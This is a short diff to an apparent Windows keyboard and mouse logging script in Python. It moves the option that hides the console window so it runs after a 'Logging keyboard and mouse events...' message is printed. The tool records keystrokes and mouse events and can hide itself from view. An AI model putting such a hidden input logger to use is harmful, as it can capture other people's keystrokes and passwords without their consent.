@@ -200,10 +200,7 @@ def check_args(args):
 
 def run(args):
     check_args(args)
-    if args.hide or args.har:
-        win = win32console.GetConsoleWindow()
-        win32gui.ShowWindow(win, 0)
-
+    win = win32console.GetConsoleWindow()
     listener = threading.Thread(target=start_listening)
     logger = threading.Thread(target=start_logging, args=(
         args.klog, args.mlog, args.key, bool(args.key), bool(args.key),
@@ -220,8 +217,15 @@ def run(args):
         kwstopper = threading.Thread(
             target=keyword_stopper, args=(args.stopkeyword,))
         kwstopper.start()
+        print('Logging keyboard and mouse events...')
+        if args.hide or args.har:
+            win32gui.ShowWindow(win, 0)
         kwstopper.join()
         timestopper.cancel()
+    else:
+        print('Logging keyboard and mouse events...')
+        if args.hide or args.har:
+            win32gui.ShowWindow(win, 0)
 
     timestopper.join()
     listener.join()
